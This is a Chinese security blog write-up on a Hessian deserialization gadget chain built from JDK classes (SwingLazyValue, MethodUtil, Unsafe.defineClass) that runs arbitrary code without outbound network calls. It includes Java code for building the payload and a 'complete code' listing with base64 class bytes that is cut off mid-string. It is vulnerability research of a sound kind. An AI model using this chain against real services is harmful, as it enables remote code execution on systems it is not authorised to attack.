---
title: 探寻Hessian JDK原生反序列化不出网的任意代码执行利用链
url: https://blog.wanghw.cn/security/hessian-deserialization-jdk-rce-gadget.html
source: Whwlsfb's Tech Blog
date: 2022-12-13
fetch_date: 2025-10-04T01:18:28.541378
---

# 探寻Hessian JDK原生反序列化不出网的任意代码执行利用链

[跳至内容](#content)

[Whwlsfb's Tech Blog](/)

# 探寻Hessian JDK原生反序列化不出网的任意代码执行利用链

发布者：[whwlsfb](/author/whwlsfb)[2022年12月12日2024年3月22日](/security/hessian-deserialization-jdk-rce-gadget.html)[探寻Hessian JDK原生反序列化不出网的任意代码执行利用链有 2 条评论](/security/hessian-deserialization-jdk-rce-gadget.html#comments)

> [2024-03-22 更新]
>
> 需要注意的是，这条链存在一条致命缺陷，在Method类中有一个名为slot的int类型参数，该参数用于给jvm定位该Method在类的方法列表的索引，[代码详见](https://github.com/openjdk/jdk8u/blob/78c0afa3281b59d2f9cb8675a66b839bd4e7747b/hotspot/src/share/vm/runtime/reflection.cpp#L1145)。但是这个slot参数并不是固定的，在每次jvm加载类时，该slot将有可能发生变化。
>
> 在Hessian的流程中，将会很耿直的直接获取该slot值直接序列化与反序列化，在反序列化利用链触发invoke时如果slot值异常，jvm在提取Method时就会获取到错误的Method对象，直接进行调用时如果参数的数量或类型错误时将有可能产生异常，但是jvm并没有做对应异常处理，这将会导致jvm直接崩溃。
>
> 所以很遗憾的是该利用链目前并不稳定，不建议实战使用。🥲
>
> 希望在未来有方法能解决该问题。

最近看到一些师傅在做一个CTF的时候找到了Hessian的JDK原生反序列化的利用链，简单了解Hessian的反序列化原理，发现其只需要通过调用`SerializerFactory`的`setAllowNonSerializable(true);`函数关闭Serializable派生类检查，就可以使其序列化、反序列化任何没有继承Serializable的类，这点相较于原生反序列化稍微有点特殊。

在一个师傅的文章里找到了一条JDK原生的可以invoke任意函数，或实例化任意类的gadget：

```
UIDefaults.get
  UIDefaults.getFromHashTable
    UIDefaults$LazyValue.createValue
      SwingLazyValue.createValue
```

invoke任意函数，最常见的就是执行命令`Runtime.getRuntime().exec()`，JNDI注入`InitialContext.doLookup()`，都有师傅根据上述gadget给出了相应的实现。

但是在实际场景中，各种防护系统对于此类敏感操作都较为敏感，能否不执行命令、不出网直接执行任意代码呢？

不出网执行任意代码的手段之一是将字节码`defineClass`然后`newInstense`，比如像基于`TemplatesImpl`的原生反序列化。

根据组里flowerwind大哥分析`SwingLazyValue.createValue`函数的代码逻辑时发现，该函数在`methodName`为空的情况下，可直接对用户传入的`className`进行实例化操作。

```
  public Object createValue(UIDefaults var1) {
        try {
            ReflectUtil.checkPackageAccess(this.className);
            Class var2 = Class.forName(this.className, true, (ClassLoader)null);
            Class[] var3;
            if (this.methodName != null) {
                var3 = this.getClassArray(this.args);
                Method var6 = var2.getMethod(this.methodName, var3);
                this.makeAccessible(var6);
                return var6.invoke(var2, this.args);
            } else {
                var3 = this.getClassArray(this.args);
                Constructor var4 = var2.getConstructor(var3);
                this.makeAccessible(var4);
                return var4.newInstance(this.args);
            }
        } catch (Exception var5) {
            return null;
        }
    }
```

于是只需要找寻可`defineClass`的路径即可。

几番寻找后我找到了一个有重大嫌疑的点`sun.reflect.ClassDefiner.defineClass`

```
package sun.reflect;

import java.security.AccessController;
import java.security.PrivilegedAction;
import java.security.ProtectionDomain;
import sun.misc.Unsafe;

class ClassDefiner {
    static final Unsafe unsafe = Unsafe.getUnsafe();

    ClassDefiner() {
    }

    static Class<?> defineClass(String var0, byte[] var1, int var2, int var3, final ClassLoader var4) {
        ClassLoader var5 = (ClassLoader)AccessController.doPrivileged(new PrivilegedAction<ClassLoader>() {
            public ClassLoader run() {
                return new DelegatingClassLoader(var4);
            }
        });
        return unsafe.defineClass(var0, var1, var2, var3, var5, (ProtectionDomain)null);
    }
}
```

看起来可以利用命令执行链中的`sun.reflect.misc.MethodUtil.invoke()`来实现利用链，看起来非常完美🤤。

于是构造开始

```
Method invoke = MethodUtil.class.getMethod("invoke", Method.class, Object.class, Object[].class);
Method defineClass = Class.forName("sun.reflect.ClassDefiner").getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class, ClassLoader.class);
defineClass.setAccessible(true);
Object[] ags = new Object[]{invoke, new Object(), new Object[]{defineClass, null, new Object[]{"print", bcode, 0, bcode.length, Thread.currentThread().getContextClassLoader()}}};

SwingLazyValue swingLazyValue = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", ags);
Object[] keyValueList = new Object[]{"abc", swingLazyValue};
UIDefaults uiDefaults1 = new UIDefaults(keyValueList);
UIDefaults uiDefaults2 = new UIDefaults(keyValueList);
Hashtable<Object, Object> hashtable1 = new Hashtable<>();
Hashtable<Object, Object> hashtable2 = new Hashtable<>();
hashtable1.put("a", uiDefaults1);
hashtable2.put("a", uiDefaults2);
serObj(hashtable1, hashtable2);
readObj();
```

[![](/wp-content/uploads/2022/10/image-3-1024x397.png)](/wp-content/uploads/2022/10/image-3.png)

看起来是ClassLoader里的path参数在反序列化阶段出现了问题，打断点发现，Hessian在处理URL类型时貌似存在缺陷，手动构造一个类，仅添加一个URL参数，也会出现相同的报错。

[![](/wp-content/uploads/2022/10/image-4-1024x572.png)](/wp-content/uploads/2022/10/image-4.png)

于是尝试将`sun.reflect.ClassDefiner.defineClass`的`classLoader`参数置空，发现同样可成功`defineClass`

[![](/wp-content/uploads/2022/10/image-5-1024x705.png)](/wp-content/uploads/2022/10/image-5.png)

正当我一阵狂喜，尝试newInstense，一盆冷水却浇了下来…

[![](/wp-content/uploads/2022/10/image-6-1024x550.png)](/wp-content/uploads/2022/10/image-6.png)

仔细阅读`ClassDefiner.defineClass`源码发现，应该是其新实例化的ClassLoader导致的问题，该函数将会用`DelegatingClassLoader`类创建一个新的ClassLoader，而在新的ClassLoader中创建的类，无法在当前线程的ClassLoader中找到，自然也无法newInstense。

于是我重新梳理思路，如果我跳过`ClassDefiner.defineClass`直接调用`Unsafe.defineClass`呢？

看下Unsafe的defineClass定义，好家伙，是个`native`方法

[![](/wp-content/uploads/2022/10/image-7-1024x312.png)](/wp-content/uploads/2022/10/image-7.png)

由于`Unsafe.defineClass`不是静态方法，需要拿到Unsafe实例才能invoke，不过这个也比较简单，直接反射拿`Unsafe.theUnsafe`即可

```
Field f = Unsafe.class.getDeclaredField("theUnsafe");
f.setAccessible(true);
Object unsafe = f.get(null);
```

重新构造序列化数据

```
Method invoke = MethodUtil.class.getMethod("invoke", Method.class, Object.class, Object[].class);
Method defineClass = Unsafe.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class, ClassLoader.class, ProtectionDomain.class);
Field f = Unsafe.class.getDeclaredField("theUnsafe");
f.setAccessible(true);
Object unsafe = f.get(null);
Object[] ags = new Object[]{invoke, new Object(), new Object[]{defineClass, unsafe, new Object[]{"print", bcode, 0, bcode.length, null, null}}};
SwingLazyValue swingLazyValue = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", ags);
Object[] keyValueList = new Object[]{"abc", swingLazyValue};
UIDefaults uiDefaults1 = new UIDefaults(keyValueList);
UIDefaults uiDefaults2 = new UIDefaults(keyValueList);
Hashtable<Object, Object> hashtable1 = new Hashtable<>();
Hashtable<Object, Object> hashtable2 = new Hashtable<>();
hashtable1.put("a", uiDefaults1);
hashtable2.put("a", uiDefaults2);
serObj(hashtable1, hashtable2);
readObj();
```

[![](/wp-content/uploads/2022/10/image-11-1024x799.png)](/wp-content/uploads/2022/10/image-11.png)

走通了！

print类中的代码被成功执行，现在只需要再生成一个执行newInstense的序列化数据即可。

[![](/wp-content/uploads/2022/10/image-10-1024x727.png)](/wp-content/uploads/2022/10/image-10.png)

虽然逻辑走通了，但是需要两个序列化数据包才能实现。那么新的问题又来了，这两个步骤能不能在一个序列化数据包内实现呢？

当然也是可以的，只需要触发两次`getFromHashtable`就行了，根据逻辑修改序列化代码

[![](/wp-content/uploads/2022/10/image-12-1024x851.png)](/wp-content/uploads/2022/10/image-12.png)

完整代码

```
package org.example;

import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.SerializerFactory;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xml.internal.security.exceptions.Base64DecodingException;
import com.sun.org.apache.xml.internal.security.utils.Base64;
import sun.misc.Unsafe;
import sun.reflect.misc.MethodUtil;
import sun.swing.SwingLazyValue;

import javax.swing.*;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.security.ProtectionDomain;
import java.util.HashMap;
import java.util.Hashtable;

public class hessian_demo_main {
    static SerializerFactory serializerFactory = new SerializerFactory();
    static  byte[] bcode;

    static {
        try {
            bcode = Base64.decode("yv66vgAAADIAHwoABgARCQASABMIABQKABUAFgcAFwcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAHTHByaW50Ow...